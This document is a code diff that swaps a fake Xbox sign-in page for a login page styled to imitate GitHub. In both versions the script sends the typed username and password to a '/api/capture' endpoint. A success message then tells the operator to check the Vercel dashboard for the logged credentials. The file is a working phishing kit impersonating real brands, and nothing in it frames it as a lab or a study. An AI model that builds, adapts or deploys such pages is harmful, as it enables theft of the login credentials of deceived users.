@@ -1,148 +1,151 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Xbox</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #0e0e10;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-        .login-container {
-            width: 100%;
-            max-width: 380px;
-            padding: 40px 30px;
-            background: rgba(30, 30, 34, 0.95);
-            border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-        .xbox-logo {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        .xbox-logo span {
-            font-size: 52px;
-            font-weight: 900;
-            color: #10b981;
-            letter-spacing: -4px;
-        }
-        h2 {
-            text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 30px;
-            color: #ffffff;
-        }
-        .input-group {
-            margin-bottom: 20px;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #a1a1aa;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: #1f1f23;
-            border: 1px solid #3f3f46;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 16px;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #10b981;
-            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #10b981;
-            color: black;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: all 0.2s;
-        }
-        .btn:hover {
-            background: #34d399;
-            transform: translateY(-1px);
-        }
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            font-size: 13px;
-            color: #71717a;
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>GitHub Log Page</title>
+<style>
+  /* Reset and base styles */
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    /* Professional, neutral background with subtle gradient for elegance */
+    background: linear-gradient(135deg, #f0f2f5, #dfe3e8);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  /* Card container with glassmorphism effect */
+  .login-card {
+    background: rgba(255, 255, 255, 0.2);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border-radius: 12px;
+    padding: 40px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    border: 1px solid rgba(255, 255, 255, 0.3);
+  }
+
+  /* Heading styled similar to GitHub */
+  h2 {
+    text-align: center;
+    margin-bottom: 30px;
+    font-size: 24px;
+    font-weight: 600;
+    color: #24292f; /* GitHub dark gray */
+  }
+
+  /* Input group styles */
+  .input-group {
+    margin-bottom: 20px;
+  }
+
+  /* Labels styling */
+  .input-group label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+    color: #4b5563; /* Gray color similar to GitHub labels */
+  }
+
+  /* Input fields with glassmorphism */
+  .input-group input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid rgba(209, 213, 219, 0.5);
+    border-radius: 8px;
+    font-size: 14px;
+    background: rgba(255, 255, 255, 0.2);
+    color: #111827; /* Dark text for readability */
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+
+  /* Focus state for inputs */
+  .input-group input:focus {
+    outline: none;
+    border-color: #0366d6;
+    box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.2);
+  }
+
+  /* Submit button style */
+  .btn {
+    width: 100%;
+    padding: 14px;
+    background-color: #0366d6;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s, box-shadow 0.2s;
+  }
+
+  /* Hover effect for button */
+  .btn:hover {
+    background-color: #055ecf;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+  }
+
+  /* Optional: add focus style for accessibility */
+  .btn:focus {
+    outline: none;
+    box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.4);
+  }
+</style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="xbox-logo">
-            <span>XBOX</span>
-        </div>
-        
-        <h2>Sign in</h2>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="username">Email, phone, or username</label>
-                <input type="text" id="username" required autocomplete="off">
-            </div>
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" required autocomplete="off">
-            </div>
-            <button type="submit" class="btn">Sign in</button>
-        </form>
-
-        <div class="footer">
-            <p>Don't have an account? <span style="color:#10b981; cursor:pointer;">Create one</span></p>
-        </div>
+<div class="login-card">
+  <h2>Account Login</h2>
+  <form id="loginForm">
+    <div class="input-group">
+      <label for="username">Username</label>
+      <input type="text" id="username" required autocomplete="off" placeholder="Enter your username" />
     </div>
+    <div class="input-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" required autocomplete="off" placeholder="Enter your password" />
+    </div>
+    <button type="submit" class="btn">Log In</button>
+  </form>
+</div>
+<script>
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-           
-            const usernameVal = document.getElementById('username').value;
-            const passwordVal = document.getElementById('password').value;
-            
-            try {
-                const response = await fetch('/api/capture', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        user: usernameVal,
-                        pass: passwordVal
-                    })
-                });
-                if (response.ok) {
-                    alert('Request logged. Check Vercel Dashboard!');
-                    document.getElementById('loginForm').reset();
-                } else {
-                    alert('Error payload status: ' + response.status);
-                }
-            } catch (err) {
-                console.error('Network execution failure:', err);
-            }
-        });
-    </script>
+    const usernameVal = document.getElementById('username').value;
+    const passwordVal = document.getElementById('password').value;
+
+    try {
+      const response = await fetch('/api/capture', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          user: usernameVal,
+          pass: passwordVal
+        })
+      });
+      if (response.ok) {
+        alert('Request logged. Check Vercel Dashboard!');
+        document.getElementById('loginForm').reset();
+      } else {
+        alert('Error payload status: ' + response.status);
+      }
+    } catch (err) {
+      console.error('Network execution failure:', err);
+    }
+  });
+</script>
 </body>
 </html>
